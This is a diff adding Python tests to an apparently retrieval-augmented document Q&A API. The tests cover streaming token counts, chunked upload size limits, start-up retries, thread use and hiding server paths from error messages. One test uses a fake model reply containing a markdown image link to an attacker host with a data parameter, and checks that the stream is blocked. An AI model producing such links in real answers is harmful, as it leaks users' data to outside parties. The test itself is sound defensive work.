@@ -149,3 +149,255 @@ def test_the_page_reads_the_stream_and_shows_text_only(tmp_path):
     assert "async function streamAsk" in page and "/v1/ask/stream" in page
     assert "shown.data += text" in page and "replaced after the final check" in page
     assert ".innerHTML" not in page  # streamed text is untrusted: only text nodes and textContent
+
+
+# ---- fixes from the ultrareview of the streaming work ---------------------------------------------
+
+def test_a_blocked_stream_records_unknown_token_counts_not_zero(tmp_path):
+    client, _ = make_client(tmp_path, llm=FakeLLM(lambda s, u: "Sure. ![x](https://attacker.example/p.png?d=1) done."))
+    doc_id = upload(client, make_pdf(REPLICATION)).json()["id"]
+    ask_stream(client, doc_id)
+    saved = json.loads(next((tmp_path / "uploads" / doc_id / "chat").glob("*.json")).read_text(encoding="utf-8"))
+    usage = saved["config"]["usage"]
+    assert usage["usage_known"] is False and usage["prompt_tokens"] is None and usage["output_tokens"] is None
+    assert usage["blocked"]  # and the block itself is still recorded
+
+
+def test_a_finished_stream_keeps_the_real_token_counts(tmp_path):
+    client, _ = make_client(tmp_path, llm=FakeLLM(lambda s, u: "Copies on several nodes [S1]."))
+    doc_id = upload(client, make_pdf(REPLICATION)).json()["id"]
+    ask_stream(client, doc_id)
+    usage = json.loads(next((tmp_path / "uploads" / doc_id / "chat").glob("*.json")).read_text(encoding="utf-8"))["config"]["usage"]
+    assert "usage_known" not in usage and usage["prompt_tokens"] == 0  # the fake model reports 0; a real one reports its count
+
+
+def test_a_generator_still_running_in_a_worker_thread_is_closed_once_it_pauses():
+    import threading
+    import time
+
+    from rag.api.main import _close_when_idle
+
+    closed = threading.Event()
+    started = threading.Event()
+
+    def slow():
+        try:
+            started.set()
+            time.sleep(0.4)  # a worker thread is "inside" the generator for a while
+            yield "piece"
+            yield "never reached"
+        finally:
+            closed.set()
+
+    generator = slow()
+    worker = threading.Thread(target=lambda: next(generator), daemon=True)
+    worker.start()
+    assert started.wait(2)
+    began = time.monotonic()
+    _close_when_idle(generator, seconds=3)  # closing a running generator raises ValueError; this waits for it to pause
+    assert closed.wait(2) and time.monotonic() - began < 3
+
+
+def test_a_failed_ask_leaves_one_bubble_and_the_page_has_no_second_one(tmp_path):
+    client, _ = make_client(tmp_path)
+    page = client.get("/").text
+    assert "const failed" not in page  # the old second bubble is gone
+    assert 'msg.append(el("br"), longText(err.message))' in page  # the reason goes into the same bubble, folded when long
+
+
+# ---- fixes from the ultrareview of the API, OpenSearch and security work ----------------------------
+
+def _post_chunked(app, body_chunks):
+    """POST /v1/documents with a chunked body and no Content-Length, straight at the ASGI app."""
+    import asyncio
+
+    sent = []
+    handed_out = [0]  # bytes of the body that the app actually asked for
+
+    async def run():
+        queue = [{"type": "http.request", "body": chunk, "more_body": True} for chunk in body_chunks]
+        queue.append({"type": "http.request", "body": b"", "more_body": False})
+        position = 0
+
+        async def receive():
+            nonlocal position
+            if position < len(queue):
+                position += 1
+                handed_out[0] += len(queue[position - 1]["body"])
+                return queue[position - 1]
+            return {"type": "http.disconnect"}
+
+        async def send(message):
+            sent.append(message)
+
+        scope = {"type": "http", "method": "POST", "path": "/v1/documents", "raw_path": b"/v1/documents", "query_string": b"",
+                 "headers": [(b"host", b"testserver"), (b"content-type", b"multipart/form-data; boundary=xx")],
+                 "client": ("127.0.0.1", 1), "server": ("testserver", 80), "scheme": "http", "http_version": "1.1"}
+        await app(scope, receive, send)
+
+    asyncio.run(run())
+    return sent, handed_out[0]
+
+
+def test_a_chunked_upload_is_refused_as_soon_as_it_passes_the_limit(tmp_path):
+    from rag.api.main import create_app
+
+    client, service = make_client(tmp_path)
+    app = create_app(service, allowed_hosts=("testserver",), max_upload_bytes=1000)  # the limit is 1000 + 1 MB headroom
+    # a valid multipart body with a 6 MB "PDF", sent in 100 KB pieces with no Content-Length
+    head = b'--xx\r\nContent-Disposition: form-data; name="file"; filename="a.pdf"\r\nContent-Type: application/pdf\r\n\r\n'
+    body = head + b"%PDF" + b"x" * 6_000_000 + b"\r\n--xx--\r\n"
+    pieces = [body[i:i + 100_000] for i in range(0, len(body), 100_000)]
+    sent, consumed = _post_chunked(app, pieces)
+    start = next(m for m in sent if m["type"] == "http.response.start")
+    assert start["status"] == 413
+    assert consumed < 1_300_000 < len(body)  # it stopped reading shortly after the limit; the old code read all 6 MB first
+    assert not list((tmp_path / "uploads").iterdir())  # nothing was stored
+
+
+def test_a_declared_size_over_the_limit_is_refused_without_reading_the_body(tmp_path):
+    from fastapi.testclient import TestClient
+    from rag.api.main import create_app
+
+    _, service = make_client(tmp_path)
+    app = create_app(service, allowed_hosts=("testserver",), max_upload_bytes=1000)
+    response = TestClient(app).post("/v1/documents", files={"file": ("a.pdf", b"%PDF" + b"x" * 2_000_000, "application/pdf")})
+    assert response.status_code == 413 and "too large" in response.json()["detail"]
+
+
+def test_a_small_upload_still_goes_through_the_limit(tmp_path):
+    client, _ = make_client(tmp_path)
+    assert upload(client, make_pdf(REPLICATION)).status_code == 202
+
+
+def test_a_failed_start_is_reported_and_retried_until_it_works(tmp_path):
+    import threading
+    import time
+    from fastapi.testclient import TestClient
+    from rag.api.main import create_app
+
+    _, built = make_client(tmp_path)
+    attempts = []
+    database_up = threading.Event()
+
+    def factory():
+        attempts.append(1)
+        if not database_up.is_set():
+            raise ConnectionError("cannot connect to the database at http://10.1.2.3:9200")
+        return built
+
+    def wait_for(condition, seconds=30):
+        deadline = time.monotonic() + seconds
+        while time.monotonic() < deadline:
+            health = client.get("/v1/health").json()
+            if condition(health):
+                return health
+            time.sleep(0.05)
+        raise AssertionError("gave up waiting; last health: %r" % (health,))
+
+    with TestClient(create_app(service_factory=factory, allowed_hosts=("testserver",), retry_seconds=0.05)) as client:
+        failing = wait_for(lambda h: h["error"])  # the failure is reported, not "loading" for ever
+        assert failing["ready"] is False and "cannot connect to the database" in failing["error"] and "10.1.2.3" not in failing["error"]
+        assert client.get("/v1/status").json()["error"] == failing["error"]
+        seen = len(attempts)
+        wait_for(lambda h: len(attempts) > seen)  # and it keeps trying
+        database_up.set()  # the database comes up
+        ready = wait_for(lambda h: h["ready"])
+        assert ready["error"] is None  # the reason is cleared once it works
+
+
+def test_the_embedder_is_loaded_once_even_when_the_database_fails_first(monkeypatch, tmp_path):
+    import rag.api.main as main
+    import rag.common.config as config
+    import rag.common.embed as embed
+    import rag.common.llm as llm_module
+    import rag.common.opensearch_store as opensearch_store
+    from rag.common.chunk_store import MemoryChunkStore
+    from rag.common.embed import HashingEmbedder
+
+    loads, attempts = [], []
+    monkeypatch.setattr(embed, "get_embedder", lambda spec: loads.append(spec) or HashingEmbedder())
+    monkeypatch.setattr(llm_module, "get_llm", lambda spec, cache_dir=None: FakeLLM())
+    monkeypatch.setattr(config, "DATA_DIR", tmp_path)
+
+    class FlakyStore(MemoryChunkStore):
+        def __init__(self, *args, **kwargs):
+            attempts.append(1)
+            if len(attempts) == 1:
+                raise ConnectionError("the database is not up yet")
+            super().__init__()
+
+    monkeypatch.setattr(opensearch_store, "OpenSearchChunkStore", FlakyStore)
+    monkeypatch.setenv("RAG_STORE", "opensearch")
+    monkeypatch.setenv("RAG_EMBEDDER", "hash-for-this-test")
+    main._EMBEDDERS.clear()
+    try:
+        try:
+            main.build_default_service()
+        except ConnectionError:
+            pass
+        main.build_default_service()  # the second try, once the database is up
+    finally:
+        main._EMBEDDERS.clear()
+    assert len(attempts) == 2 and len(loads) == 1  # the model was not loaded again for the second try
+
+
+def test_a_batch_of_uploads_does_not_use_up_the_worker_threads(tmp_path):
+    import asyncio
+    import threading
+
+    import httpx
+    from anyio import to_thread
+    from rag.api.main import create_app
+
+    _, service = make_client(tmp_path)
+    release = threading.Event()
+    started = []
+
+    def slow_ingestion(doc_id):
+        started.append(doc_id)
+        release.wait(30)  # one ingestion is running; the others must wait without holding threads
+
+    service.run_ingestion = slow_ingestion
+    app = create_app(service, allowed_hosts=("testserver",))
+
+    async def scenario():
+        limiter = to_thread.current_default_thread_limiter()
+        async with httpx.AsyncClient(transport=httpx.ASGITransport(app=app), base_url="http://testserver") as client:
+            files = [{"file": (f"d{i}.pdf", make_pdf(REPLICATION + f" variant {i}"), "application/pdf")} for i in range(8)]
+            uploads = [asyncio.create_task(client.post("/v1/documents", files=f)) for f in files]
+            for _ in range(600):  # until all eight are stored and the first ingestion has begun
+                await asyncio.sleep(0.05)
+                if started and len(service.list("local")) == 8:
+                    break
+            await asyncio.sleep(0.3)
+            samples = []
+            for _ in range(5):
+                samples.append(limiter.borrowed_tokens)
+                await asyncio.sleep(0.1)
+            release.set()
+            await asyncio.gather(*uploads)
+            return samples
+
+    samples = asyncio.run(scenario())
+    assert len(started) >= 1
+    # the running ingestion holds one worker thread; seven queued ones must hold none (they used to hold seven)
+    assert max(samples) <= 2, f"worker threads held while queued: {samples}"
+
+
+def test_a_failed_ask_does_not_show_server_paths(tmp_path):
+    def broken(system, user):
+        raise FileNotFoundError("[Errno 2] No such file or directory: 'C:\\Rohit_C\\data\\uploads\\ab12cd34ef56\\chunks\\recursive.jsonl'")
+
+    client, _ = make_client(tmp_path, llm=FakeLLM(broken))
+    doc_id = upload(client, make_pdf(REPLICATION)).json()["id"]
+    detail = client.post(f"/v1/documents/{doc_id}/ask", json={"question": "replication"}).json()["detail"]
+    assert "Rohit_C" not in detail and "uploads" not in detail and "FileNotFoundError" in detail
+    events = frames(ask_stream(client, doc_id))
+    assert "Rohit_C" not in events[-1][1]["detail"]
+
+
+def test_the_page_shows_why_the_models_did_not_load(tmp_path):
+    client, _ = make_client(tmp_path)
+    page = client.get("/").text
+    assert "h.error" in page and "Could not start" in page
